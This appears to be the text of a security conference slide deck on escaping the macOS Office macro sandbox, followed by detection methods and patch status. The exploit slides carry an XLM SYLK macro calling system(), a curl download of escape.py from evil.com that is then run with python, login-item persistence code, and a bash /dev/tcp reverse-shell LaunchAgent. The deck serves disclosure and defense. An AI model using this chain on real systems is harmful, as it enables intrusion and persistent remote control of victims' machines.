E 
01 
02 
03 
04 
05 
06 
07 
PoC.slk: spawn calc (via XLM)
...macros are (now) sandboxed
SANDBOX BYPASS
spawning  calc, is now, far from end-game
$ codesign --display -v --entitlements - "Microsoft Word.app" 
... 
com.apple.security.temporary-exception.sbpl 
(allow file-read* file-write* 
  (require-any 
    (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$")) 
  ) 
)
...now patched
"....allows us to create a file anywhere on the 
filesystem as long as it ends with ~$something"   
-(Adam Chester)
 (deny file-write* 
  (subpath (string-append (param "_HOME") "/Library/Application Scripts")) 
  (subpath (string-append (param "_HOME") "/Library/LaunchAgents"))) 
Word's (Office) Sandbox Profile
"In a sandboxed application, child processes created with 
the Process class inherit the sandbox of the parent app" -Apple
...download & execute; allowed
SANDBOX BYPASS
escape?
# processMonitor  
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", 
  "process" : { 
     "path" : "/usr/bin/curl",  
      "arguments" : [ 
        "curl", 
        "-L", 
        "http://evil.com/escape.py", 
        "-o", 
        "/tmp/~$escape.py" 
      ], 
     } 
}, 
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",  
  "process" : { 
     "path" : "/System/Library/.../2.7/bin/python2.7",   
     "arguments" : [ 
        "python", 
        "/tmp/~$escape.py" 
     ], 
  } 
} 
curl / python...allowed!
process monitor
network comms
script execution 
sandbox allows:
sandboxed
via user login item 
SANDBOX BYPASS
#create (CF)URL to app (e.g. Terminal.app) 
appURL = CoreFoundation.CFURLCreateWithFileSystemPath( 
          kCFAllocatorDefault, path2App.get_ref(), 
          kCFURLPOSIXPathStyle, 1) 
#get the list of (existing) login items 
items = CoreServices.LSSharedFileListCreate( 
          kCFAllocatorDefault,  
          kLSSharedFileListSessionLoginItems, None) 
#add app to list of login items  
CoreServices.LSSharedFileListInsertItemURL( 
             loginItems, kLSSharedFileListItemLast, 
             None, None, appURL, None, None)
01 
02 
03 
04 
05 
06 
07 
08 
09 
10 
11 
12 
13 
# TrueTree 
/System/Library/LaunchDaemons/com.apple.loginwindow.plist 
 /System/Library/CoreServices/loginwindow.app 
  /System/Applications/Utilities/Terminal.app
~$escape.py
loginwindow -> login items 
(TrueTree, J. Bradley)
un-sandboxed!
...macros are (now) sandboxed
QUARANTINED / NOTARIZATION
can't pass args to login items :( 
...just persist our own (payload)?
any created payload: com.apple.quarantine 
(can't $ xattr -rc in sandbox)
$ xattr ~\$payload 
com.apple.quarantine 
$ xattr -p com.apple.quarantine /tmp/~\$payload 
0086;5e4c4b7a;Microsoft Excel;
NN;NAuto_open;ER101C1;KOut Flank;F 
C;X1;Y102;K0;ECALL("libc.dylib","system","JC","touch /tmp/\~\$payload")
01 
02 
blocked :(
...an idea
QUARANTINED / NOTARIZATION
a launch agent:
run apple binary 
pass arguments!
avoids `com.apple.quarantine`
creating launch agents: disallowed! 
 (deny file-write* 
  (subpath (string-append (param "_HOME") "/Library/LaunchAgents"))) 
  ProgramArguments 
     /bin/bash 
     -c 
     /bin/bash -i &gt;&amp; /dev/tcp//8080 0&gt;&amp;1 
  ...
01 
02 
03 
04 
05 
06 
07 
08 
09 
10 
reverse shell, via bash
sandbox rule
...an idea
QUARANTINED / NOTARIZATION
sandbox escape 
...apple only, with no args  
quarantine 'bypass' 
...but can't create (from sandbox)
escape
create launch 
agent
...must find a way for an apple binary (with no 
arguments), to create a launch agent for us!
...an idea! 
ARCHIVE UTILITY.APP
$ lsregister -dump 
... 
rank:               Default 
bundle:             Archive Utility 
bindings:           public.zip-archive, .zip
Archive Utility
Archive Utility.app
Q: what happens if we 
"persist" a .zip file !?
A: macOS invokes its default handler! 
        (apple binary, outside the sandbox)
.zip login item!?
~/Library/~$payload.zip
LaunchAgents/
foo.plist
launch agent "created"
"remotely" infecting macOS
FULL EXPLOIT CHAIN
user opens .slk file
downloads & "persists" 
~$payload.zip
LaunchAgents/
on (next) login, "Archive 
Utility" invoked & unzips 
 ...creating launch agent
on (next) login, launch 
agent runs ...reverse shell!
an "unsandboxed" reverse shell ...game over!
FULL EXPLOIT CHAIN
  ProgramArguments 
     /bin/bash 
     -c 
     /bin/bash -i &gt;&amp; /dev/tcp//8080 0&gt;&amp;1 
  ...
01 
02 
03 
04 
05 
06 
07 
08 
09 
launch agent (reverse shell, via bash)
runs outside sandbox
can download & 
unquarantine files! 
OSX.WindTail
final payload: 
(repurposed) OSX.WindTail
Defense
protection against macro based attacks
...Microsoft & Apple
FIXES & BUG REPORTS
"is a known issue  
...on the Apple side" !?
full report to Apple
macro bug  
patched: CVE-2019-1457
patched: 10.15.3
process monitoring 
DETECTION
# ./processMonitor 
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",  
  ... 
  "path" : "/Applications/Microsoft Excel.app",   
  "pid" : 1406 
}  
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", 
  "process" : { 
     "path" : "/usr/bin/curl",  
     "arguments" : [ 
        "curl", 
        "http://evil.com/escape.py", 
        "-o", 
        "/tmp/~$escape.py" 
     ], 
     "ppid" : 1406 
   } 
} 
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",  
  "process" : { 
     "path" : "/System/Library/.../2.7/bin/python2.7",   
     "arguments" : [ 
        "python", 
        "/tmp/~$escape.py" 
     ], 
     "ppid" : 1406 
   } 
}
Excel (pid: 1406) spawning curl & python!?
curl
python
suspicious children!
file monitoring (persistence)
DETECTION
# ./fileMonitor 
{ 
  "event" : "ES_EVENT_TYPE_NOTIFY_WRITE", 
  "file" : { 
   "destination" : "~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm", 
   "path" : "/System/Library/CoreServices/backgroundtaskmanagementagent", 
  } 
}
login item persistence (backgrounditems.btm)
"Block Blocking Login Items" 
objective-see.com/blog/blog_0x31.html
non-app login item!?
suspicious persistence!
via JamfProtect (MonitorKit + Apple's game engine)
GENERICALLY DETECTING MAC MALWARE
MonitorKit
Apple's game (logic) engine
actions 
(alert, log, etc)
alert !
...in the news
Conclusion
TAKE AWAYS
Ensure your macOS systems are protected 
by a behavior-based security tool!
macro attacks  
...targeting macOS users
defense in depth!!
MAHALO!
"Friends of Objective-See" 
PI:EMAIL
Airo
Guardian 
Mobile Firewall
SecureMac
SmugMug
iVerify
Digital Guardian
Sophos
Halo Privacy
"THE ART OF MAC MALWARE" 
https://taomm.org
Announcing:
volume 0x1: Analysis
infection vectors
methods of persistence
analysis tools & techniques
visit:
author: p. wardle
free (online) books
@patrickwardle  
• 'Cryptocurrency Businesses Still Being Targeted by Lazarus' -Kaspersky  
• 'Abusing the SYLK File Format'  -Pieter Ceelen & Stan Hegt Pitts 
• 'Lazarus APT Targets Mac Users With Poisoned Word Document' -Phil Stokes
RESOURCES:
IMAGES:
• WIRDOU.COM/ 
• GITHUB.COM/ARIS-T2
Office Drama